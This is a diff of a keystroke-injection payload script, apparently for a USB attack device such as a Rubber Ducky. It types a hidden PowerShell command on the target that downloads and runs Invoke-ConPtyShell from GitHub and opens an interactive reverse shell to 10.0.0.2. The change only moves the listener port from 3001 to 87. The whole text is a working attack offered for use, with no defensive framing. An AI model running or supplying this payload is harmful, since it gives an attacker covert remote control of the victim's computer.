@@ -15,7 +15,7 @@ ALT y
 DELAY 1000
 GUI r
 DELAY 100
-STRING powershell -w hidden "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001"
+STRING powershell -w hidden "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 87"
 ENTER
 STRING exit
 ENTER
